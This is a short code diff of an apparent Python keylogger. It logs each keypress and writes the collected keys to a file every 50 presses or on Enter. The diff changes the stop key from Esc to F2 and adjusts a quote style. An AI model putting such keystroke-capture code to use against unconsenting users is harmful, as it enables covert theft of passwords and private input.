@@ -13,13 +13,13 @@ def on_press(key):
 
     print("{0} pressed".format(key))
 
-    if count >= 50 or str(key) == 'Key.enter':
+    if count >= 50 or str(key) == "Key.enter":
         count = 0
         write_file(keys)
         keys = []
 
 def on_release(key):
-    if key == Key.esc:
+    if key == Key.f2:
         return False
 
 def write_file(keys):
